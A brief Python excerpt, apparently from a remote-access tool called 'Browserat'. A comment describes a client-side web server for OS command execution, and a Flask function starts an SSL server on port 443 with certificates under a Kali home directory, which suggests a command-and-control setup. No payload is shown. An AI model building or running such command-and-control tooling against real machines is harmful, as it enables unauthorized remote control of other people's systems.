...
LOCALHOST_ADDRESS = "https://localhost:8899/do" #Browserat client-side web-server for OS command execution
...
def run_server():
	global app
	app.run(host='0.0.0.0', port=443,ssl_context=('/home/kali/ssl/commandCert.crt', '/home/kali/ssl/Control.key') ,threaded=True,debug=False, use_reloader=False)
